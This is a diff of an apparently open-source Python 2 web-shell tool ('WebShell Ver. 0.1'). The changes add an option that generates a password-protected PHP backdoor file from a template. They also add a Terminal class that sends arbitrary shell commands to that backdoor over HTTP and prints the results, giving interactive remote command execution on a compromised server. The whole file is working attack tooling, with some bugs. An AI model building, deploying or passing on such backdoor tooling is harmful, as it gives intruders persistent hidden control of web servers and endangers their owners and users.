@@ -1,5 +1,5 @@
-# usr/bin/python 
-#import requests
+#!/usr/bin/python
+# import requests
 import sys
 import os
 import urllib  
@@ -8,63 +8,99 @@ import argparse
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-u", help="Url to attack")
+parser.add_argument("-u", help="Url")
+parser.add_argument("-g", help="Generate Shell")
+parser.add_argument("-p", help="Password")
 args = parser.parse_args()
-
-print """	      ___           ___           ___           ___           ___     
-	     /\  \         /\__\         /\  \         /\  \         /\  \    
-	    /::\  \       /:/  /        /::\  \       /::\  \        \:\  \   
-	   /:/\:\  \     /:/__/        /:/\:\  \     /:/\ \  \        \:\  \  
-	  /:/  \:\  \   /::\  \ ___   /:/  \:\  \   _\:\~\ \  \       /::\  \ 
-	 /:/__/_\:\__\ /:/\:\  /\__\ /:/__/ \:\__\ /\ \:\ \ \__\     /:/\:\__\
-
-	  \:\ \:\__\        \::/  /   \:\  /:/  /   \:\ \:\__\     /:/  /     
-	   \:\/:/  /        /:/  /     \:\/:/  /     \:\/:/  /     \/__/      
-	    \::/  /        /:/  /       \::/  /       \::/  /                 
-	     \/__/         \/__/         \/__/         \/__/"""
+#BANNER 
+print "\n"   
+for line in open("banner.txt"):
+	print line,
+print "\n"   
+print "     [*]------------------- WebShell Ver. 0.1 @matiasmenares -------------------[*]\n"
 print " "
-print "     [*]------------------- WebShell 0.1 @matiasmenares -------------------[*]"
-print " "
-print " "
-if args.u:
+if args.u and args.p:
     url = args.u
+    password = args.p
+if args.g and args.p:
+    name = args.g  # Name of text file coerced with +.txt
+    password = args.p
+    isphp = name.partition('.')
+    if isphp[2] == "php":
+	    print 'Creating Shell file...'
+	    try:
+	        file =  open(name, 'w')   # Trying to create a new file or open one
+	        file.close()
+	        create = True
+		with open('backdoor/shell.php') as f:
+			with open(name, "w") as f1:
+				for line in f:
+					if "<password>" in line:
+						f1.write("		if($_GET['pass'] == '"+password+"'){ \n")
+					else:
+						f1.write(line)
+	    except:
+	        print('Something went wrong!')
+	        sys.exit(1)
     
 def conect():
-	targer = urllib.urlopen(url)
-	if targer.getcode() == 200:
-		return True
-	else:
-		return False
-if conect() == False:
-	print "No response"
-	sys.exit(2)
-
-def target(url):
-	targer = urllib.urlopen(url+"?a="+input)
+	targer = urllib.urlopen(url+"?pass="+args.p)
 	if targer.getcode() == 200:
 		htmlSource = targer.read()
 		j = json.loads(htmlSource)
 		return j
 	else:
-		print "No response"
+		print "robot@shelly$> Server Not Respond."
 		sys.exit(2)
-		
+	
+
+
 def server_info():
-	targer = urllib.urlopen(url+"?a=whoami")
+	targer = urllib.urlopen(url+"?pass="+args.p)
 	if targer.getcode() == 200:
 		htmlSource = targer.read()
 		j = json.loads(htmlSource)
 		return j['server_info']
-		
-def terminal(input):
-	if input == "exit":
-		print "Bye :)"
-		sys.exit(2)
-	return target(url)
 
-server_info = server_info()
 
-while True:
-	input = raw_input(server_info['server_name']+"@"+server_info['user']+server_info['user_bash']+">")
-	termina = terminal(input)
-	print termina['command']
+class Terminal:
+	
+	def __init__(self,url,password):
+		self.url = url
+		self.password = password
+
+	def terminal(self,send):
+		command = self.command(send)
+		if command == False:
+			return self.execute(send)
+	
+	def command(self,send):
+		if send == "exit":
+			print "\nBye :)"
+			sys.exit(2)
+		else:
+			return False
+	
+	def execute(self,input):
+		targer = urllib.urlopen(self.url+"?a="+input+"&pass="+self.password)
+		if targer.getcode() == 200:
+			htmlSource = targer.read()
+			response = json.loads(htmlSource)
+			return response
+		else:
+			print "No response"
+			sys.exit(2)
+if args.u and args.p:			
+	con = conect()
+	if con['response'] == '200':
+		print "#> Conecction Established, Enjoy!\n"
+		terminal = Terminal(url,args.p)
+		server_info = server_info()
+		while True:
+			send = raw_input(server_info['server_name']+"@"+server_info['user']+"["+server_info['pwd']+"]"+server_info['user_bash']+">")
+			termina = terminal.terminal(send)
+			print termina['command']
+	elif con['response'] == '302':
+		print "robot@shelly[~]$> Response: "+con['error']
+	else:
+		print "robot@shelly[~]$> Connection fail."
